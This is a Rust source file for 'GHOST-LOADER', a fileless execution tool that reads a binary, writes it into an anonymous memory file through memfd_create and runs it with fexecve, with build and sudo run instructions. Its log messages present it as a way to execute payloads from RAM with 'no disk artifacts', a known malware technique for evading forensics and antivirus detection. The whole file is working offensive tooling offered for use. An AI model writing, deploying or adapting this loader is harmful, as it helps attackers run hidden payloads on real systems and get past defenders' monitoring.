// GHOST-LOADER - Fileless Binary Execution Engine
// Compile: cargo build --release
// Run: sudo ./target/release/ghost-loader <path_to_binary>

use std::env;
use std::ffi::CString;
use std::fs::File;
use std::io::{self, Read};
use std::os::raw::{c_char, c_int, c_uint};
use std::ptr;

const SYS_MEMFD_CREATE: c_int = 319;

extern "C" {
    fn syscall(num: c_int, ...) -> c_int;
    fn write(fd: c_int, buf: *const u8, count: usize) -> isize;
    fn fexecve(fd: c_int, argv: *const *const c_char, envp: *const *const c_char) -> c_int;
    fn lseek(fd: c_int, offset: i64, whence: c_int) -> i64;
}

const SEEK_SET: c_int = 0;

fn main() -> io::Result<()> {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        eprintln!("[!] Usage: sudo {} <path_to_binary>", args[0]);
        std::process::exit(1);
    }

    let target_path = &args[1];
    println!("[GHOST-LOADER] Initializing fileless execution engine...");
    println!("[GHOST-LOADER] Target payload: {}", target_path);

    let mut file = File::open(target_path)?;
    let mut payload = Vec::new();
    file.read_to_end(&mut payload)?;
    println!("[+] Payload loaded into memory. Size: {} bytes.", payload.len());

    let name = CString::new("ghost_payload").unwrap();
    let fd = unsafe {
        syscall(SYS_MEMFD_CREATE, name.as_ptr(), 0 as c_uint) as c_int
    };

    if fd < 0 {
        eprintln!("[!] Failed to create memory file descriptor.");
        return Err(io::Error::last_os_error());
    }
    println!("[+] Anonymous memory file descriptor created: {}", fd);

    let written = unsafe {
        write(fd, payload.as_ptr(), payload.len())
    };

    if written < 0 || written as usize != payload.len() {
        eprintln!("[!] Failed to write payload to memory FD.");
        return Err(io::Error::last_os_error());
    }
    println!("[+] Payload injected into RAM. No disk artifacts created.");

    unsafe { lseek(fd, 0, SEEK_SET); }

    println!("[!] Executing payload directly from RAM...");
    
    let arg0 = CString::new("ghost_payload").unwrap();
    let argv = [arg0.as_ptr(), ptr::null()];
    let envp = [ptr::null()];

    unsafe {
        fexecve(fd, argv.as_ptr(), envp.as_ptr());
    }

    eprintln!("[!] Execution failed. The payload might be invalid.");
    Err(io::Error::last_os_error())
}
